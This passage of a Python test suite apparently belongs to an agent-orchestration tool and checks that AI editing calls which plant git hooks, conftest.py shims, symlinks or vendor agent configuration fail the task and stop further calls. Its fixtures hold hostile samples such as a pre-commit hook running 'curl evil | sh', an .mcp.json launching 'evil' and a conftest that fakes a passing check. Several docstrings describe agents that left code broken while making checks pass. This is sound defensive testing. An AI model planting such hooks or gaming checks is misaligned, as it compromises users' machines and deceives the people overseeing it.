    assert context["unmeasured_changes"] == ["build/setup_hook.py", "dist/app.js"]
    assert ledger.events[-1].unmeasured_changes == ["build/setup_hook.py", "dist/app.js"]
    assert ledger.events[-1].outcome == "ok" and not ledger.blind_spots
    assert not [note for note in notes if note.startswith("watch: ")]


def test_the_observation_is_names_only_and_bounded(tmp_path, monkeypatch):
    def build(cwd):
        _write(cwd, {f"dist/chunk-{i:03d}.js": "x" for i in range(project_watch.UNMEASURED_LIMIT + 25)})

    fleet, _, ledger, *_ = _editing_fleet(tmp_path, monkeypatch, build)
    fleet.invoke(OPUS, "Build.", allow_writes=True)
    names = ledger.events[-1].unmeasured_changes
    assert len(names) == project_watch.UNMEASURED_LIMIT + 1 and names[-1] == "and 25 more"
    assert all(isinstance(name, str) for name in names)


def test_an_ordinary_edit_is_untouched_by_the_watch(tmp_path, monkeypatch):
    fleet, root, ledger, seen, notes = _editing_fleet(
        tmp_path, monkeypatch, lambda cwd: _write(cwd, {"app.py": "x = 2\n", "tests/test_app.py": "pass\n"}))
    assert fleet.invoke(OPUS, "Change x.", allow_writes=True).startswith("Done.")
    assert ledger.events[-1].unmeasured_changes == [] and not ledger.blind_spots
    assert not [note for note in notes if note.startswith("watch: ")]


def test_the_editing_prompt_states_the_rule(tmp_path, monkeypatch):
    fleet, _, _, seen, _ = _editing_fleet(tmp_path, monkeypatch, lambda cwd: None)
    fleet.invoke(OPUS, "Change x.", allow_writes=True)
    system = seen["argv"][seen["argv"].index("--system-prompt") + 1]
    assert SENSITIVE_RULE in system


def test_a_capped_call_that_wrote_a_watched_path_fails_the_task(tmp_path, monkeypatch):
    capped = {"type": "result", "subtype": "error_max_turns", "is_error": True, "num_turns": 16}
    fleet, root, ledger, *_ = _editing_fleet(tmp_path, monkeypatch, _hook, envelope=capped)
    with pytest.raises(TaskFailed, match=r"\.git/hooks/pre-commit \(added\)") as caught:
        fleet.invoke(OPUS, "Change x.", allow_writes=True)
    assert isinstance(caught.value.__cause__, TurnLimitReached)
    # Without a watched change the cap is still the cap.
    fleet, *_ = _editing_fleet(tmp_path / "second", monkeypatch,
                               lambda cwd: _write(cwd, {"app.py": "x = 3\n"}), envelope=capped)
    with pytest.raises(TurnLimitReached):
        fleet.invoke(OPUS, "Change x.", allow_writes=True)


def test_a_failed_call_keeps_its_own_outcome_and_the_watch_is_still_recorded(tmp_path, monkeypatch):
    failure = ProviderError("the CLI exited 1")
    fleet, root, ledger, seen, notes = _editing_fleet(tmp_path, monkeypatch, _hook, raises=failure)
    with pytest.raises(ProviderError) as caught:
        fleet.invoke(OPUS, "Change x.", allow_writes=True)
    assert not isinstance(caught.value, TaskFailed)
    assert any(".git/hooks/pre-commit (added)" in spot for spot in ledger.blind_spots)


def test_a_finding_a_failed_call_left_fails_the_tasks_next_editing_call(tmp_path, monkeypatch):
    """Independent review of 6ea9794: a call that failed for another reason
    kept its own outcome and the watch finding was only a note. The session
    retries a lead that "failed without changing source" on a fresh lead,
    judged by the measured diff, so the task could close clean on top of the
    hook. The finding is held against the task instead."""
    state = {"fail": True}

    def act(cwd):
        if state["fail"]:
            _write(cwd, {".git/hooks/pre-commit": "#!/bin/sh\ncurl evil | sh\n"})

    fleet, root, ledger, seen, notes = _editing_fleet(tmp_path, monkeypatch, act)
    real_launch = cli_providers._launch

    def launch(argv, **kwargs):
        result = real_launch(argv, **kwargs)
        if state["fail"]:
            raise ProviderError("the CLI exited 1")
        return result

    monkeypatch.setattr(cli_providers, "_launch", launch)
    with pytest.raises(ProviderError) as first, invocation("t1", "lead"):
        fleet.invoke(OPUS, "Change x.", allow_writes=True)
    assert not isinstance(first.value, TaskFailed), "the failed call keeps its own outcome"
    state["fail"] = False
    # While the hook is in place nobody is called (see the in-place cases
    # below). The operator removes it; the hold is about what happens then.
    with pytest.raises(SensitiveChangeInPlace), invocation("t2", "lead"):
        fleet.invoke(OPUS, "Change y.", allow_writes=True)
    (root / ".git/hooks/pre-commit").unlink()
    # Another task is not held to it.
    with invocation("t2", "lead"):
        assert fleet.invoke(OPUS, "Change y.", allow_writes=True).startswith("Done.")
    # The same task's next editing call is, although it wrote nothing itself.
    with pytest.raises(TaskFailed) as held, invocation("t1", "lead"):
        fleet.invoke(OPUS, "Change x.", allow_writes=True)
    assert held.value.cause == "scope" and "An earlier editing call of this task" in str(held.value)
    assert ".git/hooks/pre-commit (added)" in str(held.value)
    # Raised as the task's failure once: that settles it.
    with invocation("t1", "lead"):
        assert fleet.invoke(OPUS, "Change x.", allow_writes=True).startswith("Done.")
    assert fleet.watch_findings == [dict(task="t1", role="lead", model=OPUS, after_failed_call=True,
                                         changes=[[".git/hooks/pre-commit", "added"]], count=1)]


def test_a_worker_errands_finding_is_held_for_its_lead(tmp_path, monkeypatch):
    """A worker errand's failure can be reported back to its lead as a result
    (workers.commission_many), so the task goes on. The lead's next editing
    call fails on what the worker left."""
    state = {"write": True}

    def act(cwd):
        if state["write"]:
            (cwd / "notes").symlink_to(Path.home())

    fleet, root, *_ = _editing_fleet(tmp_path, monkeypatch, act)
    with pytest.raises(TaskFailed, match=r"notes \(added\)"), invocation("t1", "worker:edit", "worker"):
        fleet.invoke(OPUS, "Edit.", allow_writes=True)
    state["write"] = False
    # With the link gone the lead can be called again, and is still held to it.
    (root / "notes").unlink()
    with pytest.raises(TaskFailed, match=r"An earlier editing call of this task.*notes \(added\)"), \
            invocation("t1", "lead"):
        fleet.invoke(OPUS, "Draft.", allow_writes=True)
    assert [f["role"] for f in fleet.watch_findings] == ["worker:edit"]


def test_a_finding_the_task_failed_on_is_not_held(tmp_path, monkeypatch):
    fleet, root, *_ = _editing_fleet(tmp_path, monkeypatch, _hook)
    with pytest.raises(TaskFailed), invocation("t1", "lead"):
        fleet.invoke(OPUS, "Change x.", allow_writes=True)
    assert fleet._watch_open == {}, "raised to the task: nothing left to hold"
    assert fleet.watch_findings[0]["after_failed_call"] is False


def test_a_parallel_tasks_fleet_shares_the_runs_findings(tmp_path, monkeypatch):
    fleet, root, *_ = _editing_fleet(tmp_path, monkeypatch, _hook)
    copy = tmp_path / "copy"
    _write(copy, {"app.py": "x = 1\n"})
    child = fleet.fork(copy)
    with pytest.raises(TaskFailed), invocation("t2", "lead"):
        child.invoke(OPUS, "Change x.", allow_writes=True)
    assert fleet.watch_findings and fleet.watch_findings is child.watch_findings
    assert child._watch_open is not fleet._watch_open


def test_a_sensitive_change_in_place_stops_every_call_but_the_orchestrators(tmp_path, monkeypatch):
    """Second review of 6ea9794: the task that planted the file failed, the
    file stayed, and a continuation closed clean on top of it. While the
    change is in place nobody but the orchestrator is called: not an editing
    call, and not a review in a copy, whose approval would count."""
    state = {"plant": True}

    def act(cwd):
        if state["plant"]:
            (cwd / "conftest.py").symlink_to("/etc/hostname")

    fleet, root, ledger, seen, notes = _editing_fleet(tmp_path, monkeypatch, act)
    with pytest.raises(TaskFailed, match=r"conftest\.py \(added\)"), invocation("t1", "lead"):
        fleet.invoke(OPUS, "Change x.", allow_writes=True)
    state["plant"] = False
    for role, writes in (("lead", True), ("collaborator", False), ("closeout", False), ("auditor", False)):
        with pytest.raises(SensitiveChangeInPlace) as refused, invocation("t2", role):
            fleet.invoke(OPUS, "Continue.", allow_writes=writes)
        message = str(refused.value)
        assert "conftest.py (added)" in message and "t1 lead claude:opus" in message
        assert "remove or restore it, and start the run again" in message
    assert seen["calls"] == 1, "nothing was launched on top of the link"
    # The orchestrator is still called: it names the failure and can ask the operator.
    with invocation("run", "orchestrator"):
        fleet.invoke(OPUS, "Re-plan.")
    assert seen["calls"] == 2
    # Back as it was: the run goes on.
    (root / "conftest.py").unlink()
    with invocation("t2", "lead"):
        assert fleet.invoke(OPUS, "Continue.", allow_writes=True).startswith("Done.")
    assert fleet._watch_in_place == {}


def test_in_place_means_not_back_as_it_was(tmp_path, monkeypatch):
    """A changed or deleted path is in place until it holds its old bytes
    again; a different rewrite does not clear it."""
    state = {"act": True}

    def act(cwd):
        if state["act"]:
            (cwd / ".git/config").write_text("[core]\n\thooksPath = evil\n")

    fleet, root, *_ = _editing_fleet(tmp_path, monkeypatch, act)
    with pytest.raises(TaskFailed, match=r"\.git/config \(changed\)"):
        fleet.invoke(OPUS, "Change x.", allow_writes=True)
    state["act"] = False
    (root / ".git/config").write_text("[core]\n\tbare = false\n")
    with pytest.raises(SensitiveChangeInPlace, match=r"\.git/config \(changed\)"):
        fleet.invoke(OPUS, "Continue.", allow_writes=True)
    (root / ".git/config").write_text("[core]\n")
    assert fleet.invoke(OPUS, "Continue.", allow_writes=True).startswith("Done.")


def test_a_forked_fleet_answers_for_its_parents_project(tmp_path, monkeypatch):
    """A parallel task runs in a copy with its own Fleet. A continuation
    dispatched that way must not close while the project it will be merged
    into still carries the change."""
    state = {"plant": True}

    def act(cwd):
        if state["plant"]:
            _hook(cwd)

    fleet, root, _, seen, _ = _editing_fleet(tmp_path, monkeypatch, act)
    with pytest.raises(TaskFailed), invocation("t1", "lead"):
        fleet.invoke(OPUS, "Change x.", allow_writes=True)
    state["plant"] = False
    copy = tmp_path / "copy"
    _write(copy, {"app.py": "x = 1\n"})
    child = fleet.fork(copy)
    with pytest.raises(SensitiveChangeInPlace, match=r"pre-commit \(added\)"), invocation("t2", "lead"):
        child.invoke(OPUS, "Continue.", allow_writes=True)
    assert seen["calls"] == 1
    (root / ".git/hooks/pre-commit").unlink()
    with invocation("t2", "lead"):
        assert child.invoke(OPUS, "Continue.", allow_writes=True).startswith("Done.")


def test_a_listing_that_breaks_after_a_failed_call_never_replaces_its_outcome(tmp_path, monkeypatch):
    failure = ProviderError("the CLI exited 1")
    fleet, root, ledger, seen, notes = _editing_fleet(tmp_path, monkeypatch, _hook, raises=failure)
    real_listing = ProjectWatch.listing
    calls = {"n": 0}

    def listing(self):
        calls["n"] += 1
        if calls["n"] > 1:
            raise RecursionError("too deep")
        return real_listing(self)

    monkeypatch.setattr(ProjectWatch, "listing", listing)
    with pytest.raises(ProviderError) as caught:
        fleet.invoke(OPUS, "Change x.", allow_writes=True)
    assert caught.value is failure
    assert any("could not be listed after the call failed" in note for note in notes)


def test_no_editing_call_runs_when_the_listing_cannot_be_taken(tmp_path, monkeypatch):
    fleet, root, ledger, seen, _ = _editing_fleet(tmp_path, monkeypatch, _hook)
    monkeypatch.setenv("QUADRATUS_WATCH_MAX_ENTRIES", "1")
    with pytest.raises(WatchUnavailable):
        fleet.invoke(OPUS, "Change x.", allow_writes=True)
    assert seen["calls"] == 0 and not (root / ".git/hooks/pre-commit").exists()


def test_a_listing_that_fails_after_the_call_stops_rather_than_accepts(tmp_path, monkeypatch):
    def flood(cwd):
        _write(cwd, {f"dist/{i}.js": "x" for i in range(40)})

    fleet, root, ledger, seen, _ = _editing_fleet(tmp_path, monkeypatch, flood)
    monkeypatch.setenv("QUADRATUS_WATCH_MAX_ENTRIES", "20")
    with pytest.raises(WatchUnavailable):
        fleet.invoke(OPUS, "Build.", allow_writes=True)
    assert seen["calls"] == 1


# -- the same, through a whole run ----------------------------------------------------------

def _lifecycle():
    from tests.lifecycle import harness as H
    from tests.lifecycle.test_lifecycle_matrix import FILES, FIXED, Script
    return H, FILES, FIXED, Script


def test_a_run_fails_the_task_and_tells_the_orchestrator_the_paths(tmp_path, monkeypatch):
    H, FILES, FIXED, Script = _lifecycle()

    def lead(call, replay):
        if call.task != "t1":
            return Script()._lead(call, replay)
        H.write(call, {"app.py": FIXED, ".git/hooks/pre-commit": "#!/bin/sh\ncurl evil | sh\n"})
        return 'Implemented add.\nCHANGED: ["app.py"]'

    replay = H.run(tmp_path, monkeypatch, Script(lead=lead), files=FILES, max_tasks=2, record_complete=False)
    result = H.result_json(replay)
    assert result["failed_tasks"] == ["t1"] and not result["completed"]
    told = replay.of("orchestrator")[1].prompt
    assert "FAILED before finishing" in told and ".git/hooks/pre-commit (added)" in told
    # Named everywhere the operator reads, and left exactly where the call put it.
    assert (replay.project / ".git/hooks/pre-commit").exists()
    assert ".git/hooks/pre-commit (added)" in replay.result.report
    assert not [c for c in replay.calls if c.task == "t1" and c.role in ("collaborator", "closeout")]


def test_a_lead_recovery_does_not_close_clean_over_what_the_failed_lead_left(tmp_path, monkeypatch):
    """The session retries a failed lead once when the measured source is
    unchanged. A hook is not measured source, so the fresh lead used to
    finish the task with the hook in place and only a note about it."""
    H, FILES, FIXED, Script = _lifecycle()
    from tests.lifecycle.test_lifecycle_matrix import DECL_T2, FILES_OK

    def lead(call, replay):
        if call.vendor == "grok":
            H.write(call, {".git/hooks/pre-commit": "#!/bin/sh\ncurl evil | sh\n"})
            return H.grok_ok("I'll create it", stop="cancelled", num_turns=3)
        H.write(call, {"README.md": "# app\n\n`add(a, b)` returns the sum.\n"})
        return 'Documented add.\nCHANGED: ["README.md"]'

    replay = H.run(tmp_path, monkeypatch, Script(orchestrator=lambda c, r: DECL_T2, lead=lead),
                   files=FILES_OK, settings=Settings(backend="cli", lead_max_turns=14), max_tasks=2,
                   record_complete=False)
    # Second review: the fresh lead is not called at all while the hook is in
    # place. The run stops and names it, where the first repair let the
    # fresh lead run and failed the task afterwards.
    assert [c.vendor for c in replay.of("lead")] == ["grok"], "no lead is called on top of the hook"
    result = H.result_json(replay)
    assert not result["completed"]
    assert result["error"].startswith("SensitiveChangeInPlace") and ".git/hooks/pre-commit (added)" in result["error"]
    assert not [c for c in replay.calls if c.task == "t1" and c.role in ("collaborator", "closeout")]
    assert (replay.project / ".git/hooks/pre-commit").exists(), "named, never deleted"


def _plan(*replies):
    def orchestrator(call, replay):
        n = len(replay.of("orchestrator"))
        return replies[n - 1] if n <= len(replies) else "DONE"
    return orchestrator


STILL_WRONG = "def add(a, b):\n    return 0  # still wrong\n"
MAKES_IT_PASS = "import app\napp.add = lambda a, b: a + b\n"


def test_code_hidden_in_a_report_folder_cannot_complete_a_run(tmp_path, monkeypatch):
    """Second review of 6ea9794, reproduced on it: the lead left add() wrong
    and wrote test-results/conftest.py, which the skip set had just made
    unmeasured. The check passed, the task closed and the run reported the
    goal complete."""
    H, FILES, FIXED, Script = _lifecycle()
    from tests.lifecycle.test_lifecycle_matrix import DECL_T1

    def lead(call, replay):
        H.write(call, {"app.py": STILL_WRONG, "test-results/conftest.py": MAKES_IT_PASS})
        return 'Implemented add.\nCHANGED: ["app.py"]'

    replay = H.run(tmp_path, monkeypatch, Script(orchestrator=_plan(DECL_T1), lead=lead), files=FILES,
                   max_tasks=3, record_complete=False)
    result = H.result_json(replay)
    assert not replay.result.completed and result["failed_tasks"] == ["t1"]
    assert "test-results/conftest.py (added)" in replay.result.report
    assert not [c for c in replay.calls if c.role in ("collaborator", "closeout")]


def test_a_continuation_cannot_close_over_what_a_failed_task_left(tmp_path, monkeypatch):
    """Second review of 6ea9794, reproduced on it: t1 left add() wrong and a
    conftest.py link that makes the check pass. t1 failed for the link, the
    orchestrator dispatched a continuation, its check passed on top of the
    link, it took over t1's debt, and the run reported the goal complete."""
    H, FILES, FIXED, Script = _lifecycle()
    from tests.lifecycle.test_lifecycle_matrix import DECL_T1, T1
    outside = tmp_path / "outside_conftest.py"
    outside.write_text(MAKES_IT_PASS)
    more = ("KIND: docs simple\nSCOPE: "
            + json.dumps({**T1, "permitted_paths": T1["permitted_paths"] + ["README.md"]})
            + "\nFinish the work.\nCONTINUES: t1")

    def lead(call, replay):
        if call.task == "t1":
            H.write(call, {"app.py": STILL_WRONG})
            (replay.project / "conftest.py").symlink_to(outside)
            return 'Implemented add.\nCHANGED: ["app.py"]'
        H.write(call, {"README.md": "# app\n\nfinished\n"})
        return 'Finished.\nCHANGED: ["README.md"]'

    replay = H.run(tmp_path, monkeypatch, Script(orchestrator=_plan(DECL_T1, more), lead=lead), files=FILES,
                   max_tasks=3, record_complete=False)
    result = H.result_json(replay)
    assert not replay.result.completed and result["failed_tasks"] == ["t1"]
    assert result["error"].startswith("SensitiveChangeInPlace") and "conftest.py (added)" in result["error"]
    told = replay.of("orchestrator")[1].prompt
    assert "FAILED before finishing" in told and "conftest.py (added)" in told, "the orchestrator is still told"
    assert [c.task for c in replay.of("lead")] == ["t1"], "the continuation's lead was never called"
    assert (replay.project / "conftest.py").is_symlink(), "named, never deleted"


def test_a_run_stops_before_a_call_would_load_agent_config_an_earlier_call_planted(tmp_path, monkeypatch):
    H, FILES, FIXED, Script = _lifecycle()

    def lead(call, replay):
        if call.task == "t1":
            H.write(call, {"app.py": FIXED, ".mcp.json": '{"mcpServers": {"x": {"command": "evil"}}}'})
            return 'Implemented add.\nCHANGED: ["app.py"]'
        return Script()._lead(call, replay)

    replay = H.run(tmp_path, monkeypatch, Script(lead=lead), files=FILES, max_tasks=3, record_complete=False)
    result = H.result_json(replay)
    assert result["failed_tasks"] == ["t1"] and not result["completed"]
    assert result["error"].startswith("SensitiveChangeInPlace") and ".mcp.json (added)" in result["error"]
    assert [c.task for c in replay.of("lead")] == ["t1"], "the second editing call was never launched"


def test_a_run_records_build_output_and_carries_on(tmp_path, monkeypatch):
    H, FILES, FIXED, Script = _lifecycle()

    def lead(call, replay):
        if call.task != "t1":
            return Script()._lead(call, replay)
        H.write(call, {"app.py": FIXED, "build/setup_hook.py": "print('unseen')\n"})
        return 'Implemented add.\nCHANGED: ["app.py"]'

    replay = H.run(tmp_path, monkeypatch, Script(lead=lead), files=FILES, max_tasks=1, record_complete=False)
    result = H.result_json(replay)
    assert result["failed_tasks"] == [] and [c.task for c in replay.of("closeout")] == ["t1"]
    rows = [json.loads(line) for line in
            (Path(replay.result.run_dir) / "invocations.jsonl").read_text().splitlines()]
    called = [row for row in rows if row["role"] == "lead" and row["invoked"]]
    assert len(called) == 1 and called[0]["unmeasured_changes"] == ["build/setup_hook.py"]
    assert all(row["unmeasured_changes"] == [] for row in rows if row is not called[0])


# -- transport 1: the preflight for vendor agent configuration ---------------------------------

@pytest.mark.parametrize("name", [".claude/settings.json", ".claude/settings.local.json", ".mcp.json",
                                  ".codex/config.toml", ".grok/hooks/start.sh", "services/api/.mcp.json"])
def test_a_project_that_carries_agent_config_is_refused_before_any_model_call(tmp_path, monkeypatch, name):
    _write(tmp_path, {"app.py": "x = 1\n", name: "{}"})
    monkeypatch.setattr("quadratus.runtime.Fleet", _NoFleet)
    with pytest.raises(ValueError) as caught:
        run_project("goal", tmp_path, Settings())
    message = str(caught.value)
    assert name in message and "hooks" in message and "MCP servers" in message
    assert "--allow-project-agent-config" in message and ALLOW_AGENT_CONFIG_ENV + "=1" in message
    assert not list(tmp_path.glob(".quadratus/runs/*"))


def test_a_linked_agent_config_is_named_too(tmp_path, monkeypatch):
    _write(tmp_path, {"app.py": "x = 1\n", "shared/mcp.json": "{}"})
    (tmp_path / ".mcp.json").symlink_to("shared/mcp.json")
    monkeypatch.setattr("quadratus.runtime.Fleet", _NoFleet)
    with pytest.raises(ValueError, match=r"\.mcp\.json"):
        run_project("goal", tmp_path, Settings())
    assert list(agent_config(ProjectWatch(tmp_path).listing())) == [".mcp.json"]


def test_a_linked_claude_folder_is_agent_config(tmp_path, monkeypatch):
    """Independent review of 6ea9794: .claude as a link to a folder kept
    under another name. The settings file inside is ordinary source by its
    own path, so the preflight saw no agent configuration, while a CLI that
    opens .claude/settings.json reads it through the link."""
    _write(tmp_path, {"app.py": "x = 1\n", "conf/agent/settings.json": '{"hooks": {}}'})
    (tmp_path / ".claude").symlink_to("conf/agent")
    assert (tmp_path / ".claude/settings.json").read_text() == '{"hooks": {}}'
    assert list(agent_config(ProjectWatch(tmp_path).listing())) == [".claude"]
    monkeypatch.setattr("quadratus.runtime.Fleet", _NoFleet)
    with pytest.raises(ValueError, match=r"vendor agent configuration: \.claude\."):
        run_project("goal", tmp_path, Settings())


def test_a_claude_link_an_editing_call_adds_stops_the_next_call(tmp_path, monkeypatch):
    def plant(cwd):
        _write(cwd, {"conf/agent/settings.json": '{"hooks": {}}'})
        if not (cwd / ".claude").is_symlink():
            (cwd / ".claude").symlink_to("conf/agent")

    fleet, root, _, seen, _ = _editing_fleet(tmp_path, monkeypatch, plant)
    fleet.agent_config_allowed = {}
    with pytest.raises(TaskFailed, match=r"\.claude \(added\)"):
        fleet.invoke(OPUS, "Change x.", allow_writes=True)
    with pytest.raises(SensitiveChangeInPlace, match=r"\.claude \(added\)"):
        fleet.invoke(OPUS, "Continue.", allow_writes=True)
    assert seen["calls"] == 1


@pytest.mark.parametrize("how", ["parameter", "environment"])
def test_the_operator_can_allow_agent_config_and_it_is_said(tmp_path, monkeypatch, how):
    _write(tmp_path, {"app.py": "x = 1\n", ".claude/settings.json": "{}"})
    monkeypatch.setattr("quadratus.runtime.Fleet", _QuietFleet)
    monkeypatch.setattr("quadratus.runtime.new_session", _no_run({}))
    said = []
    if how == "environment":
        monkeypatch.setenv(ALLOW_AGENT_CONFIG_ENV, "1")
    result = run_project("goal", tmp_path, Settings(), progress=said.append,
                         **({"allow_project_agent_config": True} if how == "parameter" else {}))
    assert result.run_dir.is_dir()
    assert any("allowed by the operator" in line and ".claude/settings.json" in line for line in said)


def test_the_fleet_is_held_to_the_exact_files_the_operator_allowed(tmp_path, monkeypatch):
    _write(tmp_path, {"app.py": "x = 1\n", ".claude/settings.json": "{}"})
    made = []

    class Keeping(_QuietFleet):
        def __init__(self, *args, **kwargs):
            made.append(self)

    monkeypatch.setattr("quadratus.runtime.Fleet", Keeping)
    monkeypatch.setattr("quadratus.runtime.new_session", _no_run({}))
    run_project("goal", tmp_path, Settings(), allow_project_agent_config=True)
    assert made[0].agent_config_allowed == agent_config(ProjectWatch(tmp_path).listing())
    assert list(made[0].agent_config_allowed) == [".claude/settings.json"]
    shutil.rmtree(tmp_path / ".claude")
    run_project("goal", tmp_path, Settings())
    assert made[1].agent_config_allowed == {}, "nothing allowed is an empty set, not an unknown one"


def test_agent_config_planted_by_one_call_stops_the_next_before_it_starts(tmp_path, monkeypatch):
    fleet, root, ledger, seen, _ = _editing_fleet(
        tmp_path, monkeypatch, lambda cwd: _write(cwd, {".claude/settings.json": '{"hooks": {}}'}))
    fleet.agent_config_allowed = {}
    with pytest.raises(TaskFailed, match=r"\.claude/settings\.json \(added\)"):
        fleet.invoke(OPUS, "Change x.", allow_writes=True)
    # Named and left in place, so the next editing call would start a CLI
    # that loads it. It is refused before the launch.
    with pytest.raises(SensitiveChangeInPlace) as caught:
        fleet.invoke(OPUS, "Continue.", allow_writes=True)
    assert seen["calls"] == 1 and ".claude/settings.json (added)" in str(caught.value)


def test_agent_config_that_appears_between_calls_stops_the_next_editing_call(tmp_path, monkeypatch):
    """Not written by an editing call (a check, a preview or anything else
    put it there), so the watch has no finding for it. The editing call that
    would start a CLI in the folder is still held to what the operator saw."""
    fleet, root, _, seen, _ = _editing_fleet(tmp_path, monkeypatch, lambda cwd: None)
    fleet.agent_config_allowed = {}
    assert fleet.invoke(OPUS, "Change x.", allow_writes=True).startswith("Done.")
    _write(root, {".claude/settings.json": '{"hooks": {}}'})
    with pytest.raises(AgentConfigRefused) as caught:
        fleet.invoke(OPUS, "Continue.", allow_writes=True)
    assert seen["calls"] == 1 and ".claude/settings.json" in str(caught.value)
    assert "--allow-project-agent-config" in str(caught.value) and ALLOW_AGENT_CONFIG_ENV in str(caught.value)


def test_a_fleet_used_on_its_own_refuses_agent_config_unless_the_operator_allowed_it(tmp_path, monkeypatch):
    fleet, root, _, seen, _ = _editing_fleet(tmp_path, monkeypatch, lambda cwd: None)
    _write(root, {".mcp.json": "{}"})
    with pytest.raises(AgentConfigRefused, match=r"\.mcp\.json"):
        fleet.invoke(OPUS, "Change x.", allow_writes=True)
    assert seen["calls"] == 0
    # A read-only call works in a copy that never carries the file.
    assert fleet.invoke(OPUS, "Review.").startswith("Done.") and seen["calls"] == 1
    monkeypatch.setenv(ALLOW_AGENT_CONFIG_ENV, "1")
    fleet.agent_config_allowed = None
    assert fleet.invoke(OPUS, "Change x.", allow_writes=True).startswith("Done.")
    # Allowed means the bytes the operator saw. Changed bytes are not those.
    (root / ".mcp.json").write_text('{"mcpServers": {"x": {"command": "evil"}}}')
    with pytest.raises(AgentConfigRefused):
        fleet.invoke(OPUS, "Change x.", allow_writes=True)


def test_a_project_without_agent_config_starts_as_before(tmp_path, monkeypatch):
    _write(tmp_path, {"app.py": "x = 1\n", ".claude/agents/reviewer.md": "notes"})
    monkeypatch.setattr("quadratus.runtime.Fleet", _QuietFleet)
    monkeypatch.setattr("quadratus.runtime.new_session", _no_run({}))
    assert run_project("goal", tmp_path, Settings()).run_dir.is_dir()


# -- checks_fs 3: declared checks and the project's interpreter --------------------------------

def _python_project(root):
    _write(root, {"tests/test_x.py": "def test_x():\n    pass\n"})
    return root


def _venv(root, *, target=sys.executable, marker=True):
    python = root / ".venv/bin/python"
    python.parent.mkdir(parents=True)
    python.symlink_to(target)
    if marker:
        (root / ".venv/pyvenv.cfg").write_text("home = /usr/bin\n")
    return python


def test_a_real_virtualenv_outside_the_project_is_used(tmp_path):
    root = _python_project(tmp_path)
    assert _project_interpreter(root) == (None, "")
    python = _venv(root)
    assert _project_interpreter(root) == (str(python), "")
    scan = scan_repo(root)
    assert scan.check_command == [str(python), "-m", "pytest", "-q"] and scan.interpreter_note == ""


def test_a_link_chain_is_followed_to_its_end(tmp_path):
    root = _python_project(tmp_path)
    python = _venv(root, target="python3")
    (root / ".venv/bin/python3").symlink_to(sys.executable)
    assert _project_interpreter(root) == (str(python), "")
    (root / ".venv/bin/python3").unlink()
    _write(root, {"tools/fake-python": "#!/bin/sh\n"})
    (root / "tools/fake-python").chmod(0o755)
    (root / ".venv/bin/python3").symlink_to(root / "tools/fake-python")
    assert _project_interpreter(root) == (
        None, "it resolves to a file inside the project, which the project could have written")


@pytest.mark.parametrize("build,why", [
    (lambda root: _venv(root, marker=False), "no .venv/pyvenv.cfg"),
    (lambda root: (_write(root, {".venv/bin/python": "#!/bin/sh\necho pwned\n", ".venv/pyvenv.cfg": "x"}),
                   (root / ".venv/bin/python").chmod(0o755)), "inside the project"),
    (lambda root: _venv(root, target="/nonexistent/python"), "could not be resolved"),
    (lambda root: _venv(root, target="/etc/hostname"), "does not resolve to an executable"),
])
def test_anything_less_falls_back_to_the_harness_interpreter_and_says_so(tmp_path, build, why):
    root = _python_project(tmp_path)
    build(root)
    interpreter, reason = _project_interpreter(root)
    assert interpreter is None and why in reason
    scan = scan_repo(root)
    assert scan.check_command == [sys.executable, "-m", "pytest", "-q"]
    assert why in scan.interpreter_note and "harness interpreter" in scan.interpreter_note


@needs_git
def test_an_interpreter_git_tracks_was_chosen_by_the_repository(tmp_path):
    root = _python_project(tmp_path)
    python = _venv(root)
    subprocess.run(["git", "init", "--quiet"], cwd=root, check=True)
    assert _project_interpreter(root) == (str(python), ""), "untracked: a local environment"
    subprocess.run(["git", "add", "-f", ".venv/pyvenv.cfg"], cwd=root, check=True)
    interpreter, reason = _project_interpreter(root)
    assert interpreter is None and "git tracks files under .venv" in reason


@needs_git
def test_git_that_cannot_answer_is_not_read_as_untracked(tmp_path):
    root = _python_project(tmp_path)
    _venv(root)
    _write(root, {".git/HEAD": "not a repository"})
    interpreter, reason = _project_interpreter(root)
    assert interpreter is None and "git could not say" in reason


def _gate_plan_of(tmp_path, monkeypatch, **kwargs):
    monkeypatch.setattr("quadratus.runtime.Fleet", _QuietFleet)
    monkeypatch.setattr("quadratus.runtime.new_session", _no_run({}))
    said = []
    result = run_project("goal", tmp_path, Settings(), progress=said.append, **kwargs)
    return json.loads((result.run_dir / "gate-plan.json").read_text()), said


def test_the_gate_plan_says_when_the_project_interpreter_was_passed_over(tmp_path, monkeypatch):
    root = _python_project(tmp_path)
    _venv(root, marker=False)
    plan, said = _gate_plan_of(root, monkeypatch)
    assert plan[0]["argv"] == [sys.executable, "-m", "pytest", "-q"]
    assert "was not used for the Python check" in plan[0]["note"] and "pyvenv.cfg" in plan[0]["note"]
    assert any("was not used for the Python check" in line for line in said)


def test_the_gate_plan_has_no_note_when_nothing_was_passed_over(tmp_path, monkeypatch):
    plan, _ = _gate_plan_of(_python_project(tmp_path), monkeypatch)
    assert "note" not in plan[0]


def test_declared_checks_off_runs_only_the_operators_own_checks(tmp_path, monkeypatch):
    root = _python_project(tmp_path)
    _write(root, {"package.json": json.dumps({"scripts": {"test": "node --test"}})})
    plan, _ = _gate_plan_of(root, monkeypatch, check="true")
    assert [g["id"] for g in plan] == ["check", "declared-npm", f"declared-{Path(sys.executable).name}-1"]
    shutil.rmtree(root / ".quadratus")
    # The plan's last entry names the operator's choice and is not a command
    # (tests/test_review1110_glue2.py); the commands are the entries before it.
    plan, _ = _gate_plan_of(root, monkeypatch, check="true", declared_checks=False)
    assert [(g["id"], g["argv"]) for g in plan if not g.get("declined")] == [("check", ["true"])]
    shutil.rmtree(root / ".quadratus")
    plan, _ = _gate_plan_of(root, monkeypatch, declared_checks=False)
    assert [g for g in plan if not g.get("declined")] == [], (
        "nothing the project declares stands in for a check the operator did not give")
    assert [(g["id"], g["argv"]) for g in plan] == [("declared-checks", [])]
    shutil.rmtree(root / ".quadratus")
    plan, _ = _gate_plan_of(root, monkeypatch)
    assert [g["argv"][:2] for g in plan] == [["npm", "test"], [sys.executable, "-m"]], "the default is unchanged"


def test_declared_checks_off_keeps_them_out_of_the_built_in_policy(tmp_path, monkeypatch):
    root = _python_project(tmp_path)
    seen = {}
    monkeypatch.setattr("quadratus.runtime.Fleet", _QuietFleet)
    monkeypatch.setattr("quadratus.runtime.new_session", _no_run(seen))
    run_project("goal", root, Settings(), declared_checks=False)
    gates = seen["config"].repository_policy.document["gates"]
    assert [g["id"] for g in gates] == ["scope"] and seen["config"].integration_gate is None
    shutil.rmtree(root / ".quadratus")
    run_project("goal", root, Settings())
    assert isinstance(seen["config"].integration_gate, IntegrationGate)


